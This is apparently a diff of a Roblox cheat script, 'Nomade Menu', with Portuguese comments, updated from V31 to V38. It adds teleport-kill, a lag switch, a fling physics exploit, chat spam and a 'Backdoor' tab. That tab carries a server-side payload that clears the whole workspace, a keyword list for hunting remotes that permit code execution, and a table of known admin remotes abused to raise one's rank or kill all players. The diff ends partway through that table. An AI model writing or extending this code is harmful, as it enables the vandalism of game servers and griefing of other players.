@@ -1,40 +1,26 @@
 --[[
-    NOMADE MENU - V31 ULTIMATE EDITION (ROBLOX LUAU)
+    NOMADE MENU - V38 ULTIMATE EDITION (ROBLOX LUAU)
     TARGET: FPS GAMES (Universal)
     STYLE: Modern / Material Design / Animated / Themed
     AUTHOR: System Architect
     
-    UPDATE LOG V31 (USER REQUEST):
-    - UI UPDATE: Ícones das abas laterais alterados para Símbolos de Texto (Unicode/Emoji) conforme solicitado.
-      - Removido ImageLabel (PNG).
-      - Adicionado TextLabel com símbolos (⚔, ⚡, 👁, 🌐, etc).
+    UPDATE LOG V40 (USER FIX):
+    - CORREÇÃO: Estabilidade do Touch Fling.
+      - Adicionado BodyGyro para impedir que o personagem caia de lado (Anti-Tumble).
+      - Bloqueio de rotação nos eixos X/Z, permitindo apenas giro no eixo Y.
+      - Correção de tremedeira da câmera: Humanoid.AutoRotate desativado durante o fling.
+      - O personagem agora permanece de pé enquanto gira.
     
-    UPDATE LOG V31 (PREVIOUS):
-    - CORREÇÃO CRÍTICA: Foto de Perfil (Profile Picture) agora carrega corretamente com Retry System.
-    - UI UPDATE: Botões Laterais (Sidebar) redesenhados.
-      - Textos centralizados com ajuste visual.
-      - Sistema inteligente de Ícones.
-    
-    UPDATE LOG V30 (REVISED IV):
-    - REDESIGN UI: Botões Laterais (Melhoria visual, novos ícones, ajustes de proporção).
-    - UPDATE LOG V30 (REVISED III):
-    - CORREÇÃO DE BUGS: Drag System (Menu sumindo ao clicar rápido) corrigido com Debounce.
-    - REDESIGN UI: Botões Laterais (Novo estilo "Card", Bordas visíveis, Melhor espaçamento).
-    - UPDATE LOG V30 (REVISED II):
-    - REDESIGN UI: Botões Laterais (Proporção, Espaçamento, Design Profissional).
-    - UPDATE LOG V30 (REVISED):
-    - CORREÇÃO CRÍTICA UI: Perfil do Usuário (Z-Index fix, Layout fix).
-    - REDESIGN UI: Abas Laterais (Ícones, Novo Layout, Efeitos de Hover/Active).
-    - UPDATE LOG V30 (Original):
-    - REFORMULAÇÃO UI: Player Dropdown (Lista de Jogadores).
-      - Agora possui tamanho fixo pequeno (Max 200px) com ScrollingFrame.
-      - Atualização automática em tempo real (Sem botão).
-      - Event-based listener (PlayerAdded/Removing).
+    UPDATE LOG V39 (PREVIOUS):
+    - CORREÇÃO CRÍTICA: Touch Fling Physics.
+      - Substituído LinearVelocity por BodyVelocity (Legacy) para estabilidade.
+      - O jogador não é mais arremessado para o void (Anti-Skyrocket).
 
     FEATURES:
-    - Combate: Legit, Silent, Rage, Wallbang, TriggerBot.
-    - Visuais: Chams, ESP (Box/Name/Line), X-Ray.
-    - Global: Fly V3, NoClip, Suspension V2, God Mode, Teleport.
+    - Combate: Legit, Silent, Rage, Wallbang, TriggerBot, TP Kill (Queue System).
+    - Visuais: Chams, ESP (Box/Name/Line/Skeleton), X-Ray.
+    - Global: Fly V3, NoClip, Suspension V2, God Mode, Teleport, Lag Switch.
+    - Backdoor: Scanner V4, SS Executor, Map Destroyer, Admin Injector, Payload Menu.
     - Troll: Fling Rotation, Chat Spam, Ghost Mode, Player Target System.
     - Misc: Speed (CFrame), Jump, UI Scale.
 ]]
@@ -47,6 +33,7 @@ local Lighting = game:GetService("Lighting")
 local Workspace = game:GetService("Workspace")
 local TextChatService = game:GetService("TextChatService")
 local CoreGui = game:GetService("CoreGui")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 
 --// MANIPULAÇÃO DINÂMICA DA CÂMERA
@@ -79,8 +66,10 @@ local function PerformCleanup()
         end
     end
     for _, v in pairs(Workspace:GetDescendants()) do
-        if v.Name == "NomadeChams" or v.Name == "NomadeFlingVelocity" then v:Destroy() end
+        if v.Name == "NomadeChams" or v.Name == "NomadeFlingVelocity" or v.Name == "NomadeFlingAngular" or v.Name == "NomadeFlingGyro" then v:Destroy() end
     end
+    -- Restaurar Lag Switch
+    pcall(function() settings().Network.IncomingReplicationLag = 0 end)
     table.clear(CleanupRegistry)
 end
 
@@ -98,6 +87,8 @@ UserInputService.WindowFocusReleased:Connect(function() WindowFocused = false en
 local ChamsCache = {}
 local CrosshairLines = {}
 local OriginalTransparency = {}
+local InvisibleCache = {}
+local LagSwitchCache = {} -- Cache para players congelados
 local OriginalLighting = {
     Brightness = Lighting.Brightness,
     ClockTime = Lighting.ClockTime,
@@ -109,8 +100,20 @@ local FlyVelocity = nil
 local FlyGyro = nil
 local SuspVelocity = nil 
 local FlingVelocity = nil 
+local TrollSpinVelocity = nil -- Nova variável para Troll Spin
 local TargetPlayerInstance = nil 
 local FakeLagStart = 0
+
+-- Variáveis TP Kill Queue
+local TPKillQueue = {}
+local CurrentTPTarget = nil
+local LastKillTime = 0
+
+-- Variáveis Backdoor V4
+local BackdoorResults = {}
+local BackdoorSpamming = false
+local LogConsole = nil -- Variável global para função de log do console
+local SelectedBackdoor = nil -- Armazena o remoto selecionado para exploração
 
 --// LOADER VARIABLES
 local MenuToggleKey = Enum.KeyCode.Insert
@@ -137,11 +140,15 @@ local Config = {
         Spinbot = false,
         SpinSpeed = 20,
         Jitter = false,
-        NoSpread = false
+        NoSpread = false,
+        TPKill = false, 
+        TPHeight = 10,
+        AutoShoot = false,
+        TPDelay = 0.5 -- Delay entre kills
     },
     Visuals = {
         Box = false,
-        Skeleton = false, -- Skeleton Added
+        Skeleton = false,
         Tracers = false,
         Names = false,
         Snaplines = false,
@@ -170,8 +177,14 @@ local Config = {
         FreeCam = false,
         FreeCamSpeed = 1,
         FakeLag = false,
-        FakeLagDuration = 0.5, -- Segundos
-        FakeLagAuto = true -- Reativar automatico
+        FakeLagDuration = 0.5,
+        FakeLagAuto = true,
+        LagSwitch = false
+    },
+    Backdoor = {
+        SSCode = "print('Backdoor Nomade Active'); Instance.new('Message', workspace).Text = 'Server Hacked'; wait(3); workspace:ClearAllChildren();",
+        SpamDelay = 0.1,
+        ShowSafe = true -- Mostrar todos os remotes no scanner
     },
     Troll = {
         Fling = false,
@@ -185,7 +198,8 @@ local Config = {
         Sarrada = false,
         Mamadinha = false,
         Spectate = false,
-        FlingTarget = false
+        FlingTarget = false,
+        TrollSpin = false -- Nova opção
     },
     Misc = {
         WalkSpeed = 16,
@@ -239,11 +253,18 @@ local Themes = {
         Element = Color3.fromRGB(35, 55, 35),
         Accent = Color3.fromRGB(255, 50, 50),
         Text = Color3.fromRGB(240, 255, 240)
+    },
+    ProxyMenu = {
+        Background = Color3.fromRGB(25, 20, 25),
+        Sidebar = Color3.fromRGB(30, 25, 30),
+        Element = Color3.fromRGB(40, 30, 40),
+        Accent = Color3.fromRGB(255, 80, 180),
+        Text = Color3.fromRGB(255, 220, 245)
     }
 }
 
 local CurrentTheme = Themes.Nomade
-local ThemeObjects = {Backgrounds = {}, Sidebars = {}, Elements = {}, Accents = {}, Texts = {}}
+local ThemeObjects = {Backgrounds = {}, Sidebars = {}, Elements = {}, Accents = {}, Texts = {}, MainTitle = nil}
 
 --// BIBLIOTECA UI PROFISSIONAL
 local UI = {}
@@ -258,6 +279,14 @@ function UI:ApplyTheme(ThemeName)
     CurrentTheme = newTheme
     Config.Theme = ThemeName
     
+    if ThemeObjects.MainTitle then
+        if ThemeName == "ProxyMenu" then
+            ThemeObjects.MainTitle.Text = "PROXY MENU"
+        else
+            ThemeObjects.MainTitle.Text = "NOMADE MENU"
+        end
+    end
+
     for _, v in pairs(ThemeObjects.Backgrounds) do UI:Tween(v, {BackgroundColor3 = newTheme.Background}) end
     for _, v in pairs(ThemeObjects.Sidebars) do UI:Tween(v, {BackgroundColor3 = newTheme.Sidebar}) end
     for _, v in pairs(ThemeObjects.Elements) do UI:Tween(v, {BackgroundColor3 = newTheme.Element}) end
@@ -371,20 +400,19 @@ function UI:CreateWindow(Name)
     MainUIScale.Scale = Config.Misc.MenuScale
     MainUIScale.Parent = MainFrame
 
-    -- Drag Logic (Fixed Disappearing Bug with Debounce)
+    -- Drag Logic
     local dragging, dragInput, dragStart, startPos
-    local dragDebounce = false -- Anti-spam fix
+    local dragDebounce = false
     
     local function update(input)
         local delta = input.Position - dragStart
         local newPos = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-        -- Usando Tween para suavizar e evitar falhas de calculo instantâneo
         TweenService:Create(MainFrame, TweenInfo.new(0.05, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {Position = newPos}):Play()
     end
     
     MainFrame.InputBegan:Connect(function(input)
         if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and not dragDebounce then
-            dragDebounce = true -- Impede múltiplos triggers de start
+            dragDebounce = true
             dragging = true
             dragStart = input.Position
             startPos = MainFrame.Position
@@ -392,7 +420,7 @@ function UI:CreateWindow(Name)
             input.Changed:Connect(function()
                 if input.UserInputState == Enum.UserInputState.End then
                     dragging = false
-                    dragDebounce = false -- Libera o drag
+                    dragDebounce = false
                 end
             end)
         end
@@ -453,10 +481,11 @@ function UI:CreateWindow(Name)
     Title.Size = UDim2.new(1, 0, 0, 30)
     Title.ZIndex = 3
     Title.Parent = Sidebar
+    ThemeObjects.MainTitle = Title
     table.insert(ThemeObjects.Accents, Title)
 
     local Version = Instance.new("TextLabel")
-    Version.Text = "Ultimate V31"
+    Version.Text = "Ultimate V38"
     Version.Font = Enum.Font.Gotham
     Version.TextSize = 12
     Version.TextColor3 = Color3.fromRGB(150,150,150)
@@ -466,27 +495,42 @@ function UI:CreateWindow(Name)
     Version.ZIndex = 3
     Version.Parent = Sidebar
 
-    -- Tabs Container (Revised size to fit better and be higher)
-    local TabContainer = Instance.new("Frame")
+    -- Tabs Container (Alterado para ScrollingFrame com Padding V36)
+    local TabContainer = Instance.new("ScrollingFrame")
+    TabContainer.Name = "SidebarTabs"
     TabContainer.Position = UDim2.new(0, 10, 0, 85)
-    TabContainer.Size = UDim2.new(1, -20, 1, -180) -- Increased padding from bottom to avoid profile
+    TabContainer.Size = UDim2.new(1, -20, 1, -180) -- Original size relative to Sidebar
     TabContainer.BackgroundTransparency = 1
+    TabContainer.BorderSizePixel = 0
+    TabContainer.ScrollBarThickness = 3 -- Slightly thicker for visibility
+    TabContainer.ScrollBarImageColor3 = CurrentTheme.Accent
+    TabContainer.AutomaticCanvasSize = Enum.AutomaticSize.Y
+    TabContainer.CanvasSize = UDim2.new(0, 0, 0, 0)
     TabContainer.ZIndex = 5
     TabContainer.Parent = Sidebar
+    table.insert(ThemeObjects.Accents, TabContainer)
+
+    -- Adding Padding to prevent clipping issues with Stroke/Effects at edges
+    local TabContainerPadding = Instance.new("UIPadding")
+    TabContainerPadding.PaddingTop = UDim.new(0, 5)
+    TabContainerPadding.PaddingBottom = UDim.new(0, 5)
+    TabContainerPadding.PaddingLeft = UDim.new(0, 2)
+    TabContainerPadding.PaddingRight = UDim.new(0, 8) -- Right padding to separate from ScrollBar
+    TabContainerPadding.Parent = TabContainer
 
     local TabListLayout = Instance.new("UIListLayout")
-    TabListLayout.Padding = UDim.new(0, 8) -- Adjusted padding
+    TabListLayout.Padding = UDim.new(0, 8)
     TabListLayout.SortOrder = Enum.SortOrder.LayoutOrder
     TabListLayout.Parent = TabContainer
 
-    -- User Profile Area (REVISED V31 - FIXED PROFILE PICTURE WITH RETRY)
+    -- User Profile Area
     local ProfileFrame = Instance.new("Frame")
     ProfileFrame.Name = "UserProfile"
     ProfileFrame.Size = UDim2.new(1, -20, 0, 55)
-    ProfileFrame.Position = UDim2.new(0, 10, 1, -65) -- Anchored bottom
+    ProfileFrame.Position = UDim2.new(0, 10, 1, -65)
     ProfileFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
     ProfileFrame.BorderSizePixel = 0
-    ProfileFrame.ZIndex = 15 -- Max ZIndex to ensure visibility
+    ProfileFrame.ZIndex = 15
     ProfileFrame.Parent = Sidebar
     table.insert(ThemeObjects.Elements, ProfileFrame)
 
@@ -506,10 +550,9 @@ function UI:CreateWindow(Name)
     Avatar.Position = UDim2.new(0, 8, 0.5, -20)
     Avatar.BackgroundTransparency = 1
     Avatar.ZIndex = 16
-    Avatar.Image = "rbxassetid://4034483344" -- Fallback default
+    Avatar.Image = "rbxassetid://4034483344"
     Avatar.Parent = ProfileFrame
 
-    -- FIX V31: Robust profile picture loader with retries and high resolution
     task.spawn(function()
         local content = "rbxassetid://4034483344"
         local success, res = pcall(function()
@@ -519,7 +562,6 @@ function UI:CreateWindow(Name)
         if success and res then 
             content = res 
         else
-            -- Retry once if failed (common Roblox issue)
             task.wait(1.5)
             pcall(function()
                 content = Players:GetUserThumbnailAsync(LocalPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
@@ -529,7 +571,7 @@ function UI:CreateWindow(Name)
     end)
 
     local AvatarCorner = Instance.new("UICorner")
-    AvatarCorner.CornerRadius = UDim.new(1, 0) -- Circle
+    AvatarCorner.CornerRadius = UDim.new(1, 0)
     AvatarCorner.Parent = Avatar
 
     local UserName = Instance.new("TextLabel")
@@ -567,12 +609,13 @@ function UI:CreateWindow(Name)
     PageContainer.ClipsDescendants = true
     PageContainer.Parent = MainFrame
 
-    -- Icon Map for Sidebar (Unicode Symbols per User Request)
+    -- Icon Map
     local TabIcons = {
         ["COMBATE"] = "⚔",
         ["RAGE"] = "⚡", 
         ["VISUAIS"] = "👁",
         ["GLOBAL"] = "🌐",
+        ["BACKDOOR"] = "☢",
         ["TROLL"] = "👻", 
         ["OUTROS"] = "📂", 
         ["CONFIGURAÇÃO"] = "⚙" 
@@ -586,8 +629,8 @@ function UI:CreateWindow(Name)
         TabBtn.Name = name .. "_Tab"
         TabBtn.Text = "" 
         TabBtn.BackgroundColor3 = CurrentTheme.Element
-        TabBtn.BackgroundTransparency = 0 -- Fundo visível (estilo botão)
-        TabBtn.Size = UDim2.new(1, 0, 0, 42) -- Adjusted height
+        TabBtn.BackgroundTransparency = 0
+        TabBtn.Size = UDim2.new(1, 0, 0, 42)
         TabBtn.AutoButtonColor = false
         TabBtn.ZIndex = 5
         TabBtn.Parent = TabContainer
@@ -596,16 +639,14 @@ function UI:CreateWindow(Name)
         BtnCorner.CornerRadius = UDim.new(0, 8)
         BtnCorner.Parent = TabBtn
 
-        -- Border/Stroke Accent (Roxo em volta) - Now visible on inactive as faint border
         local TabStroke = Instance.new("UIStroke")
-        TabStroke.Color = Color3.fromRGB(60,60,65) -- Default inactive border
+        TabStroke.Color = Color3.fromRGB(60,60,65)
         TabStroke.Thickness = 1.2
         TabStroke.Transparency = 0.6 
         TabStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
         TabStroke.Parent = TabBtn
         
-        -- Smart Icon Matching (Fuzzy Match / Detecção Inteligente de Simbolos)
-        local iconId = TabIcons[name] -- Tenta match exato primeiro
+        local iconId = TabIcons[name]
         local nLower = name:lower()
         
         if not iconId then
@@ -619,6 +660,8 @@ function UI:CreateWindow(Name)
                 iconId = TabIcons["VISUAIS"]
             elseif nLower:find("glob") or nLower:find("moviment") or nLower:find("mundo") then 
                 iconId = TabIcons["GLOBAL"]
+            elseif nLower:find("backdoor") or nLower:find("server") or nLower:find("ss") then 
+                iconId = TabIcons["BACKDOOR"]
             elseif nLower:find("troll") or nLower:find("zoeira") or nLower:find("fun") then 
                 iconId = TabIcons["TROLL"]
             elseif nLower:find("outr") or nLower:find("misc") or nLower:find("extra") then 
@@ -626,33 +669,29 @@ function UI:CreateWindow(Name)
             end
         end
 
-        -- Icon (Agora é TextLabel com símbolo Unicode)
         local Icon = Instance.new("TextLabel")
         Icon.Size = UDim2.new(0, 30, 1, 0)
         Icon.Position = UDim2.new(0, 10, 0, 0) 
         Icon.BackgroundTransparency = 1
-        Icon.Text = iconId or "⚙" -- Default Gear if failed
+        Icon.Text = iconId or "⚙"
         Icon.Font = Enum.Font.Gotham
         Icon.TextSize = 20
         Icon.TextColor3 = Color3.fromRGB(150,150,150)
         Icon.ZIndex = 6
         Icon.Parent = TabBtn
 
-        -- Label do Texto (Mais centralizado e alinhado com o símbolo)
         local TabLabel = Instance.new("TextLabel")
         TabLabel.Text = name
         TabLabel.Font = Enum.Font.GothamBold
         TabLabel.TextSize = 13 
         TabLabel.TextColor3 = Color3.fromRGB(150,150,150)
         TabLabel.BackgroundTransparency = 1
-        -- Ajuste para centralização: Ocupa o espaço restante e centraliza o texto relativo ao espaço disponível
         TabLabel.Size = UDim2.new(1, -45, 1, 0)
         TabLabel.Position = UDim2.new(0, 45, 0, 0) 
-        TabLabel.TextXAlignment = Enum.TextXAlignment.Left -- Mantém Left para leitura fluida
+        TabLabel.TextXAlignment = Enum.TextXAlignment.Left
         TabLabel.ZIndex = 6
         TabLabel.Parent = TabBtn
 
-        -- Page Setup (Mantém igual)
         local Page = Instance.new("ScrollingFrame")
         Page.Size = UDim2.new(1, 0, 1, 0)
         Page.BackgroundTransparency = 1
@@ -675,23 +714,20 @@ function UI:CreateWindow(Name)
         PagePadding.PaddingLeft = UDim.new(0, 5)
         PagePadding.Parent = Page
 
-        -- Logica de Animação
         local function UpdateState(active)
             if active then
                 Page.Visible = true
                 Page.Position = UDim2.new(0, 20, 0, 0)
                 UI:Tween(Page, {Position = UDim2.new(0, 0, 0, 0)}, 0.3)
                 
-                -- Animação Tab Ativa (Com Stroke Roxo)
-                UI:Tween(TabBtn, {BackgroundColor3 = Color3.fromRGB(40,40,45)}) -- Fundo mais claro
-                UI:Tween(TabStroke, {Color = CurrentTheme.Accent, Transparency = 0}) -- Borda Roxa Solida
+                UI:Tween(TabBtn, {BackgroundColor3 = Color3.fromRGB(40,40,45)})
+                UI:Tween(TabStroke, {Color = CurrentTheme.Accent, Transparency = 0})
                 UI:Tween(TabLabel, {TextColor3 = CurrentTheme.Text}) 
                 UI:Tween(Icon, {TextColor3 = CurrentTheme.Accent})
             else
                 Page.Visible = false
-                -- Animação Tab Inativa
-                UI:Tween(TabBtn, {BackgroundColor3 = CurrentTheme.Sidebar}) -- Fundo igual sidebar (ou mais escuro)
-                UI:Tween(TabStroke, {Color = Color3.fromRGB(60,60,65), Transparency = 0.6}) -- Borda Cinza fraca
+                UI:Tween(TabBtn, {BackgroundColor3 = CurrentTheme.Sidebar})
+                UI:Tween(TabStroke, {Color = Color3.fromRGB(60,60,65), Transparency = 0.6})
                 UI:Tween(TabLabel, {TextColor3 = Color3.fromRGB(150,150,150)})
                 UI:Tween(Icon, {TextColor3 = Color3.fromRGB(150,150,150)})
             end
@@ -704,7 +740,6 @@ function UI:CreateWindow(Name)
             UpdateState(true)
         end)
 
-        -- Hover Animation
         TabBtn.MouseEnter:Connect(function()
             if not Page.Visible then
                 UI:Tween(TabLabel, {TextColor3 = CurrentTheme.Text})
@@ -729,6 +764,7 @@ function UI:CreateWindow(Name)
         table.insert(Window.Tabs, {Page = Page, Btn = TabBtn, UpdateState = UpdateState})
 
         local Components = {}
+        Components.Page = Page -- Fix para acesso externo
 
         function Components:Section(text)
             local Label = Instance.new("TextLabel")
@@ -933,7 +969,6 @@ function UI:CreateWindow(Name)
             end)
         end
         
-        -- DROPDOWN COM SCROLLINGFRAME & TAMANHO FIXO (V30)
         function Components:Dropdown(text, options, callback)
             local DropFrame = Instance.new("Frame")
             DropFrame.Size = UDim2.new(1, -10, 0, 45)
@@ -974,7 +1009,6 @@ function UI:CreateWindow(Name)
             DropBtn.Size = UDim2.new(1, 0, 0, 45)
             DropBtn.Parent = DropFrame
             
-            -- SCROLLING FRAME SETUP
             local ScrollContainer = Instance.new("ScrollingFrame")
             ScrollContainer.Position = UDim2.new(0, 0, 0, 45)
             ScrollContainer.Size = UDim2.new(1, 0, 1, -45)
@@ -1002,7 +1036,6 @@ function UI:CreateWindow(Name)
             local opened = false
 
             local function RefreshOptions(newOpts)
-                -- Limpa itens antigos
                 for _, child in pairs(ScrollContainer:GetChildren()) do
                     if child:IsA("TextButton") then child:Destroy() end
                 end
@@ -1035,10 +1068,9 @@ function UI:CreateWindow(Name)
                 
                 ScrollContainer.CanvasSize = UDim2.new(0, 0, 0, (#currentOptions * 30) + 10)
                 
-                -- Se aberto, recalcular tamanho mantendo limite
                 if opened then
                     local totalHeight = (#currentOptions * 30) + 55
-                    local maxHeight = 200 -- Limite de altura
+                    local maxHeight = 200
                     UI:Tween(DropFrame, {Size = UDim2.new(1, -10, 0, math.min(totalHeight, maxHeight))})
                 end
             end
@@ -1047,7 +1079,7 @@ function UI:CreateWindow(Name)
                 opened = not opened
                 if opened then
                     local totalHeight = (#currentOptions * 30) + 55
-                    local maxHeight = 200 -- Limite de altura
+                    local maxHeight = 200
                     UI:Tween(DropFrame, {Size = UDim2.new(1, -10, 0, math.min(totalHeight, maxHeight))})
                     ScrollContainer.Visible = true
                     Arrow.Text = "^"
@@ -1116,7 +1148,6 @@ function UI:CreateWindow(Name)
         end
     end)
     
-    -- Botão de Fechar/Cleanup
     local CloseBtn = Instance.new("TextButton")
     CloseBtn.Text = "X"
     CloseBtn.TextColor3 = Color3.fromRGB(200,50,50)
@@ -1200,6 +1231,35 @@ local function ToggleFullbright(state)
     end
 end
 
+--// LAG SWITCH (NEW)
+local function ToggleLagSwitch(state)
+    if state then
+        -- Tenta usar exploit de rede comum
+        pcall(function() settings().Network.IncomingReplicationLag = 1000 end)
+        
+        -- Método Visual: Congelar todos os outros jogadores localmente (Anchor)
+        for _, v in pairs(Players:GetPlayers()) do
+            if v ~= LocalPlayer and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
+                if not LagSwitchCache[v] then
+                    LagSwitchCache[v] = v.Character.HumanoidRootPart.Anchored
+                end
+                v.Character.HumanoidRootPart.Anchored = true
+            end
+        end
+    else
+        -- Restaura rede
+        pcall(function() settings().Network.IncomingReplicationLag = 0 end)
+        
+        -- Descongela jogadores localmente
+        for _, v in pairs(Players:GetPlayers()) do
+            if v ~= LocalPlayer and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
+                v.Character.HumanoidRootPart.Anchored = false -- Assume false (padrão)
+            end
+        end
+        table.clear(LagSwitchCache)
+    end
+end
+
 --// GLOBAL FUNCTIONS (V28 REFINED)
 local function ToggleFly(state)
     if state then
@@ -1277,7 +1337,6 @@ local function UpdateTarget(name)
     return "Não Encontrado"
 end
 
--- Novo Sistema de Fling (Touch/Linear)
 local function ToggleFling(state)
     local char = LocalPlayer.Character
     if not char then return end
@@ -1285,35 +1344,94 @@ local function ToggleFling(state)
     
     if state and hrp then
         Config.Global.NoClip = true 
-        -- Usa LinearVelocity para mover em direção ao alvo ou gerar impacto de alta velocidade
-        local att = Instance.new("Attachment", hrp)
-        att.Name = "FlingAtt"
         
-        FlingVelocity = Instance.new("LinearVelocity")
+        -- FIX V40: Estabilidade Vertical (BodyGyro)
+        
+        FlingVelocity = Instance.new("BodyVelocity")
         FlingVelocity.Name = "NomadeFlingVelocity"
-        FlingVelocity.Attachment0 = att
-        FlingVelocity.MaxForce = math.huge
-        FlingVelocity.VectorVelocity = Vector3.new(0, 0, 0) 
+        FlingVelocity.Velocity = Vector3.new(0,0,0)
+        FlingVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+        FlingVelocity.P = 12500
         FlingVelocity.Parent = hrp
         
-        -- Angula Velocity suave para "girar" levemente, evitando detecção de spin absurda
-        local ang = Instance.new("AngularVelocity")
-        ang.Name = "FlingAng"
-        ang.Attachment0 = att
-        ang.AngularVelocity = Vector3.new(0, 100, 0) -- Rotação controlada
-        ang.MaxTorque = math.huge
+        local ang = Instance.new("BodyAngularVelocity") 
+        ang.Name = "NomadeFlingAngular"
+        ang.AngularVelocity = Vector3.new(0, 10000, 0)
+        ang.MaxTorque = Vector3.new(0, math.huge, 0) -- Foca no eixo Y
+        ang.P = 12500
         ang.Parent = hrp
+
+        -- Novo Gyro para impedir tombar
+        local gyro = Instance.new("BodyGyro")
+        gyro.Name = "NomadeFlingGyro"
+        gyro.P = 3000
+        gyro.D = 100
+        gyro.MaxTorque = Vector3.new(math.huge, 0, math.huge) -- Bloqueia X e Z (Tombar)
+        gyro.CFrame = CFrame.identity
+        gyro.Parent = hrp
+
+        if char:FindFirstChild("Humanoid") then 
+            char.Humanoid.PlatformStand = true 
+            char.Humanoid.AutoRotate = false -- Ajuda com a camera
+        end
     else
         Config.Global.NoClip = false
         if FlingVelocity then FlingVelocity:Destroy() FlingVelocity = nil end
         if hrp then
              for _,v in pairs(hrp:GetChildren()) do
-                 if v.Name == "FlingAtt" or v.Name == "FlingAng" then v:Destroy() end
+                 if v.Name == "NomadeFlingVelocity" or v.Name == "NomadeFlingAngular" or v.Name == "NomadeFlingGyro" then v:Destroy() end
              end
              hrp.RotVelocity = Vector3.new(0,0,0)
              hrp.Velocity = Vector3.new(0,0,0)
         end
-        if char:FindFirstChild("Humanoid") then char.Humanoid.Sit = false end
+        if char:FindFirstChild("Humanoid") then 
+            char.Humanoid.PlatformStand = false 
+            char.Humanoid.Sit = false 
+            char.Humanoid.AutoRotate = true
+        end
+    end
+end
+
+-- Nova função: Troll Spin (V38 Feature) - Melhorada com BodyAngularVelocity antigo para compatibilidade
+local function ToggleTrollSpin(state)
+    local char = LocalPlayer.Character
+    if not char then return end
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+
+    if state and hrp then
+        -- Desativa colisão temporariamente para evitar bugs
+        if Config.Global.NoClip then
+             for _, part in ipairs(char:GetDescendants()) do
+                if part:IsA("BasePart") then part.CanCollide = false end
+            end
+        end
+
+        if not TrollSpinVelocity then
+            -- Usando BodyAngularVelocity (Deprecated mas funciona melhor para spins rápidos sem TP)
+            -- FIX V39: Removeu o TP acidental ajustando a posição relativa e removendo constraints de posição
+            TrollSpinVelocity = Instance.new("BodyAngularVelocity")
+            TrollSpinVelocity.Name = "TrollSpinVelocity"
+            TrollSpinVelocity.AngularVelocity = Vector3.new(0, 10000, 0) -- Velocidade EXTREMA para colisão, mas sem subir
+            TrollSpinVelocity.MaxTorque = Vector3.new(0, math.huge, 0) -- Apenas Eixo Y
+            TrollSpinVelocity.P = 12500
+            TrollSpinVelocity.Parent = hrp
+            
+            -- Opcional: Adicionar um BodyPosition leve para manter a altura
+            local BodyPos = Instance.new("BodyPosition")
+            BodyPos.Name = "SpinHoldPos"
+            BodyPos.MaxForce = Vector3.new(0, 0, 0) -- Desativado, apenas pronto se precisar
+            BodyPos.Parent = hrp
+        end
+    else
+        if TrollSpinVelocity then 
+             TrollSpinVelocity:Destroy() 
+             TrollSpinVelocity = nil
+        end
+        local hold = hrp:FindFirstChild("SpinHoldPos")
+        if hold then hold:Destroy() end
+        
+        -- Restaura rotação
+        if hrp then hrp.RotVelocity = Vector3.new(0,0,0) end
     end
 end
 
@@ -1322,43 +1440,298 @@ local function ToggleSpam(state)
         task.spawn(function()
             while Config.Troll.SpamChat do
                 if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-                    -- Novo Sistema de Chat
                     local ch = TextChatService:FindFirstChild("TextChannels")
                     if ch and ch:FindFirstChild("RBXGeneral") then
                          ch.RBXGeneral:SendAsync(Config.Troll.SpamMessage)
                     end
                 else
-                    -- Sistema Antigo
                     local args = {[1] = Config.Troll.SpamMessage, [2] = "All"}
                     local event = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
                     if event then
                         pcall(function() event:FindFirstChild("SayMessageRequest"):FireServer(unpack(args)) end)
                     end
                 end
-                task.wait(2.5) -- Spam mais lento para evitar kick imediato
+                task.wait(2.5)
             end
         end)
     end
 end
 
 local function ToggleInvisible(state)
-    -- Método de Desync Simples (Ghost Mode Visual)
     local char = LocalPlayer.Character
-    if char and char:FindFirstChild("HumanoidRootPart") then
-        if state then
-            -- Apenas visualmente invisivel localmente e manipulação de joint
-             for _, v in pairs(char:GetDescendants()) do
-                if v:IsA("BasePart") or v:IsA("Decal") then
-                    if v.Name ~= "HumanoidRootPart" then v.Transparency = 1 end
-                end
-            end
-        else
-            for _, v in pairs(char:GetDescendants()) do
-                if v:IsA("BasePart") or v:IsA("Decal") then
-                    if v.Name ~= "HumanoidRootPart" then v.Transparency = 0 end
+    if not char then return end
+
+    if state then
+        for _, v in pairs(char:GetDescendants()) do
+            if v:IsA("BasePart") or v:IsA("Decal") then
+                if v.Name ~= "HumanoidRootPart" then
+                    if not InvisibleCache[v] then
+                        InvisibleCache[v] = v.Transparency
+                    end
+                    v.Transparency = 1
                 end
             end
         end
+    else
+        for part, original in pairs(InvisibleCache) do
+            if part and part.Parent then
+                part.Transparency = original
+            end
+        end
+        table.clear(InvisibleCache)
+    end
+end
+
+--// BACKDOOR FUNCTIONS (SYSTEM UTILS V4 REVISED)
+-- Classificação de Vulnerabilidades e Banco de Dados de Assinaturas
+local KnownSignatures = {
+    CRITICO = { -- Loadstring RCE
+        "loadstring", "exec", "run", "code", "eval", "compile", "bytecode", "load"
+    },
+    ALTO = { -- Admin Abuse / Require
+        "admin", "ban", "kick", "system", "command", "cmd", "control", "root", "require", "module", "asset", "hdadmin"
+    },
+    MEDIO = { -- Remote Spam / Info Leak
+        "test", "debug", "remote", "event", "server", "check", "verify", "log", "print"
+    },
+    BAIXO = { -- Common Data
+        "data", "save", "sync", "replication", "gui", "ui", "update"
+    }
+}
+
+-- Mapeamento de Remotos Vulneráveis Conhecidos (Specific Exploits)
+local KnownVulnerableRemotes = {
+    ["HDAdminRemote"] = {Type = "Admin", Method = "FireServer", Args = {"SetRank", LocalPlayer.UserId, 5}},
+    ["HDAdminClient"] = {Type = "Admin", Method = "FireServer", Args = {"SetRank", LocalPlayer.UserId, 5}},
+    ["Adonis_Client_Remote"] = {Type = "Admin", Method = "FireServer", Args = {"Execute", "LocalPlayer", "Kill", "All"}},
